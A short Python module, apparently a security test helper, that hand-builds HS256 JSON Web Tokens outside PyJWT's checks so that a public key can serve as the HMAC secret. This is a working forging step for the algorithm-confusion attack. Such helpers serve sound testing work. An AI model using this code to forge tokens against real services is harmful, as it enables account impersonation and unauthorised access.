"""Generate an attack token independently of the JWT library's safety checks."""

import base64
import hashlib
import hmac
import json
from collections.abc import Mapping
from datetime import datetime


def forge_hs256(claims: Mapping[str, object], key: bytes) -> str:
    """Attackers can HMAC public-key bytes even when PyJWT refuses to do so."""

    def encoded(value: object) -> bytes:
        def serialize(item: object) -> int:
            if isinstance(item, datetime):
                return int(item.timestamp())
            raise TypeError(f"Unsupported claim type: {type(item).__name__}")

        payload = json.dumps(value, separators=(",", ":"), default=serialize).encode()
        return base64.urlsafe_b64encode(payload).rstrip(b"=")

    unsigned = encoded({"alg": "HS256", "typ": "JWT"}) + b"." + encoded(dict(claims))
    signature = base64.urlsafe_b64encode(hmac.digest(key, unsigned, hashlib.sha256)).rstrip(b"=")
    return (unsigned + b"." + signature).decode("ascii")
